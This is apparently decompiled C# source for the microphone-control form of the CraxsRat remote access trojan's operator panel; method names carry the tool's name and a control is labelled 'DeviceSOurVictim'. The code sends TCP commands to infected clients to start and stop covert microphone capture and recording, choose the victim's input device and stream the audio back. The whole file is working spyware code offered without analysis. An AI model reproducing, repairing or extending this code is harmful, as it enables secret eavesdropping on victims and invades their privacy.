using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

// Token: 0x02000093 RID: 147
[DesignerGenerated]
public partial class Microphone : Form
{
	// Token: 0x0600068F RID: 1679 RVA: 0x000A5DBC File Offset: 0x000A3FBC
	public Microphone()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd;
		base.Closing += this.Microphone_Closing;
		base.FormClosing += this.Microphone_FormClosing;
		this.waveOut = null;
		this.Title = "null";
		this.bytes = new List<byte[]>();
		this.isrecording = false;
		this.InitializeComponent();
		this.Font = reso.f;
	}

	// Token: 0x06000690 RID: 1680 RVA: 0x000A5E40 File Offset: 0x000A4040
	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "zh");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
				this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "zh");
				this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "zh");
				this.b_sta.Text = Codes.Translate(this.b_sta.Text, "en", "zh");
				this.bIN.Text = Codes.Translate(this.bIN.Text, "en", "zh");
				this.TabControl1.TabPages[0].Text = Codes.Translate(this.TabControl1.TabPages[0].Text, "en", "zh");
				this.TabControl1.TabPages[1].Text = Codes.Translate(this.TabControl1.TabPages[1].Text, "en", "zh");
			}
		}
		else
		{
			this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "ar");
			this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
			this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "ar");
			this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "ar");
			this.Label5.Text = Codes.Translate(this.Label5.Text, "en", "ar");
			this.b_sta.Text = Codes.Translate(this.b_sta.Text, "en", "ar");
			this.bIN.Text = Codes.Translate(this.bIN.Text, "en", "ar");
			this.TabControl1.TabPages[0].Text = Codes.Translate(this.TabControl1.TabPages[0].Text, "en", "ar");
			this.TabControl1.TabPages[1].Text = Codes.Translate(this.TabControl1.TabPages[1].Text, "en", "ar");
		}
	}

	// Token: 0x06000691 RID: 1681 RVA: 0x000A6150 File Offset: 0x000A4350
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x06000692 RID: 1682 RVA: 0x000A6198 File Offset: 0x000A4398
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd(object sender, EventArgs e)
	{
		this.translateme();
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\13.ico");
		this.LoadDEVMicrophone();
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
	}

	// Token: 0x06000693 RID: 1683 RVA: 0x000A61F4 File Offset: 0x000A43F4
	public void SizeH()
	{
		int num = 0;
		checked
		{
			if (this.Panel1.Visible)
			{
				num += this.Panel1.Height;
			}
			if (this.Panel2.Visible)
			{
				num += this.Panel2.Height;
			}
			int num2 = base.Height - base.ClientSize.Height - 1;
			if (!this.Panel1.Visible & !this.Panel2.Visible)
			{
				this.LAB_ERR.Visible = true;
				this.LAB_ERR.Text = "No Input and No Output Devices Found";
				num = this.LAB_ERR.Height;
			}
			base.Height = num + num2;
		}
	}

	// Token: 0x06000694 RID: 1684 RVA: 0x000A62A4 File Offset: 0x000A44A4
	private void Microphone_Closing(object sender, CancelEventArgs e)
	{
		this.DrakeUILampLED1.Blink = false;
		this.DrakeUILampLED1.On = false;
		this.DrakeUILampLED1.Dispose();
		if (Operators.ConditionalCompareObjectEqual(this.isrecording, false, false))
		{
			this.isrecording = false;
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				object[] parametersObjects = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"srec<*>off",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
		}
		if (this.waveOut != null)
		{
			this.waveOut.Stop();
		}
		if (this.classWaveOut != null)
		{
			this.classWaveOut.qit = true;
			this.classWaveOut.Close(this.ClientWaveOut);
		}
		if (this.classWaveIn != null)
		{
			this.classWaveIn.qit = true;
			this.classWaveIn.Close(this.ClientWaveIn);
		}
		this.In_Stop();
	}

	// Token: 0x06000695 RID: 1685 RVA: 0x000A6458 File Offset: 0x000A4658
	private void b_sta_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, 2, false))
		{
			this.Out_Stop();
			this.b_sta.Tag = 0;
			this.b_sta.Text = "Start Microphone";
		}
		else if (Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, 0, false))
		{
			this.b_sta.Tag = 1;
			this.b_sta.Text = "...";
			this.Out_Start();
		}
	}

	// Token: 0x06000696 RID: 1686 RVA: 0x000A64E8 File Offset: 0x000A46E8
	private void Out_Start()
	{
		if (this.classClient != null)
		{
			string[] array = this.classClient.Keys.Split(new char[]
			{
				':'
			});
			int selectedIndex = this.OutBoxSource.SelectedIndex;
			if (this.classClient.Keys.Split(new char[]
			{
				':'
			})[7][1] == '0')
			{
				object[] parametersObjects = new object[]
				{
					this.Client,
					SecurityKey.KeysClient6 + Data.SPL_SOCKET,
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			object[] parametersObjects2 = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".microphone",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.resultClient,
					Data.SPL_SOCKET,
					"start",
					Data.SPL_DATA,
					array[0],
					Data.SPL_DATA,
					array[1],
					Data.SPL_DATA,
					Conversions.ToString(reso.HzInt(this.OutHZ.Text)),
					Data.SPL_DATA,
					SecurityKey.MicwaveOutByte,
					Data.SPL_DATA,
					this.classClient.ClientRemoteAddress,
					Data.SPL_DATA,
					"0"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects2);
		}
	}

	// Token: 0x06000697 RID: 1687 RVA: 0x000A66B4 File Offset: 0x000A48B4
	public void Out_Stop()
	{
		if (this.classWaveOut != null)
		{
			this.classWaveOut.qit = true;
			this.classWaveOut.Close(this.ClientWaveOut);
		}
		if (this.waveOut != null)
		{
			this.waveOut.Stop();
		}
		this.waveOut = null;
	}

	// Token: 0x06000698 RID: 1688 RVA: 0x000A6708 File Offset: 0x000A4908
	public bool In_Start(int idDevice)
	{
		this.WaveIn = new WaveIn(idDevice);
		this.WaveIn.Open(reso.FormatWave(this.rateInput));
		this.WaveIn.Start();
		this.Bgworker = new BackgroundWorker();
		if (!this.Bgworker.IsBusy)
		{
			this.DoCase = true;
			this.Bgworker.RunWorkerAsync();
			if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 1, false))
			{
				this.bIN.Tag = 2;
				this.bIN.Text = "Ready";
			}
		}
		return true;
	}

	// Token: 0x06000699 RID: 1689 RVA: 0x000A67AC File Offset: 0x000A49AC
	private void In_Stop()
	{
		this.DoCase = false;
		if (this.Bgworker != null && this.Bgworker.IsBusy)
		{
			this.Bgworker.Dispose();
		}
		this.bytes.Clear();
		if (this.classWaveIn != null)
		{
			this.classWaveIn.qit = true;
			this.classWaveIn.Close(this.ClientWaveIn);
		}
		if (this.waveOut != null)
		{
			this.waveOut.Stop();
		}
	}

	// Token: 0x0600069A RID: 1690 RVA: 0x000A682C File Offset: 0x000A4A2C
	private void LoadDEVMicrophone()
	{
		IEnumerator enumerator = null;
		try
		{
			foreach (object obj in WaveIn.Devices)
			{
				WaveInDeviceCaps waveInDeviceCaps = (WaveInDeviceCaps)obj;
				if (waveInDeviceCaps.DeviceId != -1)
				{
					waveInDeviceCaps.Name = waveInDeviceCaps.Name.Replace("(", "").Replace(")", "");
					string item = string.Format("({0})-{1}", waveInDeviceCaps.DeviceId, waveInDeviceCaps.Name);
					this.InBoxSource.Items.Add(item);
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		if (this.InBoxSource.Items.Count == 0)
		{
			this.Panel2.Visible = false;
		}
		else
		{
			this.InBoxSource.SelectedIndex = 0;
			this.DeviceSOurVictim.SelectedIndex = 0;
			this.inHZ.SelectedIndex = 0;
		}
	}

	// Token: 0x0600069B RID: 1691 RVA: 0x000A6934 File Offset: 0x000A4B34
	private void AppendByteToDisk(string FilepathToAppendTo, ref byte[] Content)
	{
		FileStream fileStream = new FileStream(FilepathToAppendTo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream.Write(Content, 0, Content.Length);
		fileStream.Close();
	}

	// Token: 0x0600069C RID: 1692 RVA: 0x000032DF File Offset: 0x000014DF
	private void OK_DataReady(object sender, DataReadyEventArgs e)
	{
		this.bytes.Add(e.Data);
	}

	// Token: 0x0600069D RID: 1693 RVA: 0x000A6960 File Offset: 0x000A4B60
	private void bIN_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 0, false))
			{
				this.In_Stop();
				this.bytes.Clear();
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				int selectedIndex = this.DeviceSOurVictim.SelectedIndex;
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".microphone",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"input",
						Data.SPL_DATA,
						array[0],
						Data.SPL_DATA,
						array[1],
						Data.SPL_DATA,
						this.classClient.ClientRemoteAddress,
						Data.SPL_DATA,
						SecurityKey.MicwaveinByte,
						Data.SPL_DATA,
						selectedIndex.ToString(),
						Data.SPL_DATA,
						Conversions.ToString(reso.HzInt(this.inHZ.Text))
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.bIN.Tag = 1;
				this.bIN.Text = "Cancel...";
			}
			else if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 1, false))
			{
				this.In_Stop();
				this.bIN.Text = "Run";
				this.bIN.Tag = 0;
			}
			else if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 2, false))
			{
				this.In_Stop();
				this.bIN.Text = "Run";
				this.bIN.Tag = 0;
			}
		}
	}

	// Token: 0x0600069E RID: 1694 RVA: 0x000A6B94 File Offset: 0x000A4D94
	private void Worker_DoWork(object sender, DoWorkEventArgs e)
	{
		checked
		{
			do
			{
				if (this.bytes.Count > 0)
				{
					byte[] array = this.bytes[0];
					try
					{
						if (this.ClientWaveIn.Client.Connected)
						{
							this.ClientWaveIn.Client.Poll(infoServer.Microseconds, SelectMode.SelectWrite);
							this.ClientWaveIn.Client.SendBufferSize = array.Length * 15;
							this.ClientWaveIn.GetStream().Write(array, 0, array.Length);
							this.classClient.MyServer.BytesSent += unchecked((long)array.Length);
						}
						goto IL_B5;
					}
					catch (Exception)
					{
						break;
					}
					IL_A4:
					this.bytes.RemoveAt(0);
					goto IL_10;
					IL_B5:
					if (this.DoCase)
					{
						goto IL_A4;
					}
				}
				IL_10:
				Thread.Sleep(1);
			}
			while (this.DoCase);
		}
	}

	// Token: 0x0600069F RID: 1695 RVA: 0x000A6C74 File Offset: 0x000A4E74
	private void InBoxSource_SelectedIndexChanged(object sender, EventArgs e)
	{
		string value = Regex.Match(this.InBoxSource.SelectedItem.ToString(), string.Concat(new string[]
		{
			"(?<=",
			Regex.Escape("("),
			").+?(?=",
			Regex.Escape(")"),
			")"
		}), RegexOptions.IgnoreCase).Value;
		this.MDeviceId = Conversions.ToInteger(value.Trim());
	}

	// Token: 0x060006A0 RID: 1696 RVA: 0x0000206C File Offset: 0x0000026C
	private void OutBoxSource_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	// Token: 0x060006A1 RID: 1697 RVA: 0x0000206C File Offset: 0x0000026C
	private void Microphone_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	// Token: 0x060006A2 RID: 1698 RVA: 0x000A6CEC File Offset: 0x000A4EEC
	private void Button1_Click_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.Button1.Tag.ToString(), "o", false) == 0)
		{
			if (this.classClient != null)
			{
				this.Button1.Tag = "f";
				TcpClient myClient = this.classClient.myClient;
				object[] parametersObjects = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"srec<*>on",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.isrecording = true;
				this.DrakeUILampLED1.On = true;
				this.DrakeUILampLED1.Blink = true;
				this.Button1.Text = "Stop Recording";
			}
		}
		else if (this.classClient != null)
		{
			this.Button1.Tag = "o";
			TcpClient myClient2 = this.classClient.myClient;
			object[] parametersObjects2 = new object[]
			{
				myClient2,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"srec<*>off",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects2);
			this.Button1.Text = "Start Recording";
			this.isrecording = false;
			this.DrakeUILampLED1.On = false;
			this.DrakeUILampLED1.Blink = false;
		}
	}

	// Token: 0x04000989 RID: 2441
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bIN")]
	private Button _bIN;

	// Token: 0x0400098A RID: 2442
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutBoxSource")]
	private ComboBox _OutBoxSource;

	// Token: 0x0400098B RID: 2443
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b_sta")]
	private Button _b_sta;

	// Token: 0x0400098C RID: 2444
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InBoxSource")]
	private ComboBox _InBoxSource;

	// Token: 0x0400098D RID: 2445
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x0400098E RID: 2446
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	// Token: 0x0400098F RID: 2447
	public Client classClient;

	// Token: 0x04000990 RID: 2448
	public TcpClient Client;

	// Token: 0x04000991 RID: 2449
	public TcpClient ClientWaveOut;

	// Token: 0x04000992 RID: 2450
	public Client classWaveOut;

	// Token: 0x04000993 RID: 2451
	public WaveOut waveOut;

	// Token: 0x04000994 RID: 2452
	private WaveIn WaveIin;

	// Token: 0x04000995 RID: 2453
	public string Title;

	// Token: 0x04000996 RID: 2454
	public List<byte[]> bytes;

	// Token: 0x04000997 RID: 2455
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Bgworker")]
	private BackgroundWorker _Bgworker;

	// Token: 0x04000998 RID: 2456
	public TcpClient ClientWaveIn;

	// Token: 0x04000999 RID: 2457
	public Client classWaveIn;

	// Token: 0x0400099A RID: 2458
	private bool DoCase;

	// Token: 0x0400099B RID: 2459
	public int MDeviceId;

	// Token: 0x0400099C RID: 2460
	public int rateInput;

	// Token: 0x0400099D RID: 2461
	public object isrecording;

	// Token: 0x040009B4 RID: 2484
	internal BackgroundWorker Bgworker;

	// Token: 0x040009B7 RID: 2487
	internal WaveIn WaveIn;
}
